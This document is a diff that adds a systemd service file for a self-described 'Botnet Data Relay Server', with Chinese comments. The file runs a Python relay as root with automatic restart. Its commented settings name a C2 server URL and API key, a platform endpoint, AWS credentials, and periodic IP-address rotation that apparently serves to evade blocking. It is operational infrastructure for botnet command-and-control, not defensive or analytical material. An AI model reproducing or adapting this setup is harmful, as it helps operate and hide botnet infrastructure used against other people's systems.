@@ -1,0 +1,39 @@
+[Unit]
+Description=Botnet Data Relay Server
+Documentation=https://github.com/your-repo/relay-server
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/path/to/relay
+ExecStart=/usr/bin/python3 /path/to/relay/relay_service.py
+Restart=always
+RestartSec=10
+StandardOutput=journal
+StandardError=journal
+
+# 环境变量（可选，也可以在配置文件中设置）
+# Environment="C2_URL=http://10.8.0.1:8888"
+# Environment="C2_API_KEY=your-c2-api-key"
+# Environment="PLATFORM_URL=http://your-platform:8000"
+# Environment="PLATFORM_API_KEY=your-platform-api-key"
+# Environment="SIGNATURE_SECRET=your-signature-secret"
+# Environment="AWS_ACCESS_KEY_ID=your-aws-key"
+# Environment="AWS_SECRET_ACCESS_KEY=your-aws-secret"
+# Environment="AWS_REGION=us-east-2"
+# Environment="AWS_INSTANCE_ID=i-xxxxx"
+# Environment="IP_CHANGE_ENABLED=true"
+# Environment="IP_CHANGE_INTERVAL=600"
+
+# 资源限制
+LimitNOFILE=65536
+LimitNPROC=4096
+
+# 安全设置
+PrivateTmp=true
+NoNewPrivileges=false
+
+[Install]
+WantedBy=multi-user.target
